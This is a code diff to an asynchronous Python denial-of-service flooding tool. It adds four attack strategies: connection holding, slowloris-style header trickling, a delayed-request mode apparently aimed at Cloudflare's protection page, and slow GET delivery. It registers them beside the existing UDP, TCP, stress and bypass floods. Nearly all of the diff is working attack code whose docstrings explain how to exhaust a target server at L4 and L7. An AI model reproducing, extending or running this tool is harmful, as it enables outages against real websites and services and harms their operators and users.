@@ -402,10 +402,11 @@ async def flood_packets_gen(
             conn = curio.open_connection(target.addr, target.port, ssl=target.ssl_context)
         conn = await curio.timeout_after(ctx.connection_timeout, conn)
         stream = conn.as_stream()
-        for payload in packets:
-            await stream.write(payload)
-            ctx.track_packet_sent(fid, target, len(payload))
-            packet_sent += 1
+        async with curio.meta.finalize(packets) as packets:
+            async for payload in packets:
+                await stream.write(payload)
+                ctx.track_packet_sent(fid, target, len(payload))
+                packet_sent += 1
     except curio.TaskTimeout:
         return 0
     except Exception as e:
@@ -438,7 +439,7 @@ async def UDP(ctx: Context, fid: int, target: Target):
 
 
 async def TCP(ctx: Context, fid: int, target: Target):
-    def gen():
+    async def gen():
         for _ in range(ctx.rpc):
             yield randbytes(ctx.packet_size)
 
@@ -452,7 +453,7 @@ async def STRESS(ctx: Context, fid: int, target: Target):
     pipelining (sending new request within persistent connection without
     reading response first).
     """
-    def gen():
+    async def gen():
         for _ in range(ctx.rpc):
             req = [
                 f"Content-Length: {ctx.packet_size+12}",
@@ -470,15 +471,105 @@ async def BYPASS(ctx: Context, fid: int, target: Target):
     async with TcpConnection(ctx, target) as conn:
         if conn.sock:
             for _ in range(ctx.rpc):
-                req = http_req_get(target)
-                await conn.sock.sendall(req)
-                chunks = []
-                while True:
-                    chunk = await conn.sock.recv(1024)
-                    if not chunk:
-                        break
-                    chunks.append(chunk)
-                ctx.track_packet_sent(fid, target, len(req) + sum(map(len, chunks)))
+                req, chunks = http_req_get(target), []
+                bytes_sent = await conn.sock.sendall(req)
+                if bytes_sent == len(req):
+                    while True:
+                        chunk = await conn.sock.recv(1024)
+                        if not chunk:
+                            break
+                        chunks.append(chunk)
+                else:
+                    logger.error(f"connection closed: {bytes_sent}/{len(req)}")
+                ctx.track_packet_sent(fid, target, bytes_sent + sum(map(len, chunks)))
+
+
+async def CONNECTION(ctx: Context, fid: int, target: Target):
+    """Opens TCP connections and keeps it alives as long as possible.
+
+    Layer: L4.
+
+    To be effective, this type of attack requires higher number of
+    fibers than usual. Note that modern servers are pretty good with
+    handling open inactive connections."""
+    async with TcpConnection(ctx, target) as conn:
+        if conn.sock:
+            conn.mark_packet_sent()
+            while await conn.sock.recv(1):
+                ctx.track_packet_sent(fid, target, 1)
+
+
+# xxx(okachaiev): configuration for time delay
+async def SLOW(ctx: Context, fid: int, target: Target):
+    """Similary to STRESS, issues RPC HTTP requests and makes an
+    attempt to keep connection utilized by reading back a single byte
+    and sending additional payload with time delays between
+    send operations.
+
+    Layer: L7.
+
+    Ideally, time delay should be setup properly
+    to avoid connection being reset by the peer because of read
+    timeout (depends on peer setup).
+    """
+    # xxx(okachaiev): should this be generated randomly each time?
+    req: bytes = http_req_payload(target, "GET")
+    async with TcpConnection(ctx, target) as conn:
+        if conn.sock:
+            for _ in range(ctx.rpc):
+                bytes_sent = await conn.sock.sendall(req)
+                ctx.track_packet_sent(fid, target, bytes_sent)
+            while True:
+                bytes_sent = await conn.sock.sendall(req)
+                if bytes_sent < len(req):
+                    break
+                await conn.sock.recv(1)
+                header = f"X-a: {randint(1,5000)}\r\n".encode()
+                header_bytes_sent = conn.sock.sendall(header)
+                # xxx(okachaiev): this will overflow as we are sending too many
+                # requests here (infinitely more than RPC). need to find a wayt
+                # to track this properly
+                ctx.track_packet_sent(fid, target, bytes_sent+header_bytes_sent)
+                await curio.sleep(ctx.rpc/15) # xxx(okachaiev): too long?
+
+
+# xxx(okachaiev): configuration for delay and for timeout
+async def CFBUAM(ctx: Context, fid: int, target: Target):
+    """Sends a single HTTP GET, after a long delay issues RPC new requests.
+
+    Layer: L7.
+    """
+    # xxx(okachaiev): should this be generated randomly each time?
+    req: bytes = http_req_payload(target, "GET")
+    async with TcpConnection(ctx, target) as conn:
+        if conn.sock:
+            bytes_sent = await conn.sock.sendall(req)
+            if bytes_sent < len(req): return
+            await curio.sleep(5.01)
+            with curio.ignore_after(120):
+                for _ in range(ctx.rpc):
+                    bytes_sent = await conn.sock.sendall(req)
+                    if bytes_sent < len(req): return
+                    ctx.track_packet_sent(fid, target, bytes_sent)
+
+
+# xxx(okachaiev): flexible delay configuration
+async def AVB(ctx: Context, fid: int, target: Target):
+    """Isses HTTP GET packets into the open connection with long
+    delays between send operations. To avoid the connection being
+    reset by the peer because of read timeout, maximum delay is set
+    to 1 second.
+
+    Layer: L7.
+    """
+    async def gen():
+        # xxx(okachaiev): should this payload be randomized on each cycle?
+        req: bytes = http_req_payload(target, "GET")
+        for _ in range(ctx.rpc):
+            await curio.sleep(max(ctx.rpc/1000, 1))
+            yield req
+
+    await flood_packets_gen(ctx, fid, target, gen())
 
 
 async def flood_fiber(fid: int, ctx: Context, target: Target):
@@ -522,9 +613,9 @@ async def flood(ctx: Context):
         show_stats(ctx, time.time()-started_at)
 
     print("==> Initializing shutdown...")
-    terminted = await curio.ignore_after(10, group.cancel_remaining())
-    print("Timeout")
-    if terminted is None:
+    timeout = object()
+    terminted = await curio.ignore_after(10, group.cancel_remaining(), timeout_result=timeout)
+    if terminted is timeout:
         print("Shutdown timeout, forcing termination")
     await group.join()
 
@@ -570,6 +661,10 @@ default_strategies = {
     "tcp": TCP,
     "stress": STRESS,
     "bypass": BYPASS,
+    "connection": CONNECTION,
+    "slow": SLOW,
+    "cfbuam": CFBUAM,
+    "avb": AVB,
 }
 
 
